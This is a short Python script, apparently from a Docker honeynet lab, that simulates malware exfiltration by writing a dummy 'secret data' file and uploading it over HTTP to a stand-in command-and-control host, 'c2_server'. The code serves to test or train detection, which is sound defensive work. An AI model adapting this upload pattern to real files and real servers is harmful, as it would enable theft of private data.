# malware_simulator/malware_simulator.py

import requests
import time

def simulate_exfiltration():
    filename = "sensitive_data.txt"
    with open(filename, "w") as f:
        f.write("Acesta sunt datele secrete exfiltrate de malware.\n")

    url = "http://c2_server:5000/upload"  # 'c2_server' e numele serviciului Docker din rețeaua 'honeynet'
    
    print("[*] Trimit fișierul către C2...")
    try:
        with open(filename, "rb") as f:
            response = requests.post(url, files={"file": f})
        print(f"[+] Răspuns de la C2: {response.status_code} {response.text}")
    except Exception as e:
        print(f"[!] Eroare la trimitere: {e}")

if __name__ == "__main__":
    # Aștept puțin ca să fie sigur că serverul C2 e up
    time.sleep(5)
    simulate_exfiltration()

